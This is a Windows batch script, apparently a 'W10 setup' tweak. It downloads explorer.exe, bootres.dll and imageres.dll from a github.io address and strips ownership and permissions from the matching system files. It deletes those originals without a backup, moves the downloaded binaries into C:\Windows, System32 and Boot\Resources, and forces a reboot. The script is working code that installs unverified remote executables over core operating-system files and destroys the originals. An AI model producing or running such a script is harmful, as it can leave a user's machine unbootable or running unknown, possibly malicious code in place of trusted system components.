@echo off
cd %temp%
md W10_setup
cd W10_setup
curl -o explorer.exe https://ahomine-off.github.io/W10/explorer.exe
curl -o bootres.dll https://ahomine-off.github.io/W10/bootres.dll
curl -o imageres.dll https://ahomine-off.github.io/W10/imageres.dll
takeown /f c:\windows\explorer.exe
takeown /f C:\Windows\Boot\Resources\bootres.dll
takeown /f C:\Windows\Boot\Resources\
takeown /f C:\Windows\System32\imageres.dll
icacls c:\windows\explorer.exe /grant %username%:F
icacls C:\Windows\Boot\Resources\bootres.dll %username%:F
icacls C:\Windows\Boot\Resources\ /grant %username%:F
icacls C:\Windows\System32\imageres.dll /grant %username%:F
del c:\windows\explorer.exe
del C:\Windows\Boot\Resources\bootres.dll
del C:\Windows\System32\imageres.dll
move explorer.exe c:\windows\explorer.exe
move bootres.dll C:\Windows\Boot\Resources\bootres.dll
move imageres.dll C:\Windows\System32\imageres.dll
pause
timeout 6 /nobreak >nul
shutdown /r /t 0 /f